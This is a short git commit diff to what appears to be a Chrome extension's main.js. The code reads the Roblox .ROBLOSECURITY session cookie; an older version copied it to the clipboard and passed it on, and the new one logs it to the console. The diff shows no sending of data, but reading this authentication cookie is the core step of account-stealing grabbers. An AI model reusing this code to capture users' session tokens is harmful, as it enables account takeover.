f87ca1cb2389394ebd95e437fb5ec07baeb95821
Drexxyyy <155772197+Drexxyyy@users.noreply.github.com>
2024-01-05 13:30:56 -0600

    Update main.js

--- main.js
+++ main.js
@@ -1,17 +1,8 @@
 chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
     if (cookie) {
-        copyToClipboard(cookie.value);
-        main(cookie.value);
-    } else {
-        main(null);
+    console.log(cookie.value);
+        
     }
 });
 
-function copyToClipboard(text) {
-    var dummy = document.createElement("textarea");
-    document.body.appendChild(dummy);
-    dummy.value = text;
-    dummy.select();
-    document.execCommand("copy");
-    document.body.removeChild(dummy);
-}
+
